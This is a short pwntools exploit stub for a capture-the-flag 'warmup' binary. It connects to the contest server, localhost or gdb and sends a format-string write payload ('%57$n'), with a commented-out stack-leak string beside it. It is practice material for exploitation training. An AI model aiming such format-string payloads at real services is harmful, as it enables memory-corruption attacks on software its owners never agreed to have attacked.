#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./warmup"

rhp1 = {'host':"warmup.ctf.defenit.kr",'port':3333} #for actual server
rhp2 = {'host':"localhost",'port':12300} #for localhost 
rhp3 = {'host':"",'port':23947} #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

bufsize = 0x100
libc_startmain_stack_off = 73
jmps = 62
stderr = 57

def exploit(conn):
  #inj = "%72$p : %73$p : %62$p : %63$p : %64$p : %65$p : %66$p : %67$p : %68$p : %69$p : %80$p\n" 
  inj = "%57$n"
  raw_input("%57$n")
  conn.send(inj)


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
  elif sys.argv[1][0]=="v":
    conn = remote(rhp3["host"],rhp3["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

